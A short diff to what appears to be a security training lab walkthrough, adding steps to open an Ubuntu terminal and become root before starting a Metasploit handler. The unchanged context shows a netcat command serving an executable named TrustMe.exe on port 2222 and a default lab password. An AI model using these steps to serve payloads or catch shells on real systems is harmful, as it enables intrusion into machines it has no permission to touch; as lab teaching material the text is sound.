@@ -49,7 +49,12 @@ Please note, the adhd password is adhd.
 
 /#`nc -l -p 2222 < TrustMe.exe`
 
-Now, let's start the Metasploit Handler.  You will have to hit Enter to get your prompt back.
+
+Now, let's start the Metasploit Handler.  First, open a new Ubuntu Terminal by clicking the down carrot then selecting Ubuntu-18.04.
+
+Let's become root.
+
+`sudo su -`
 
 
 root@DESKTOP-I1T2G01:/tmp# `msfconsole -q`
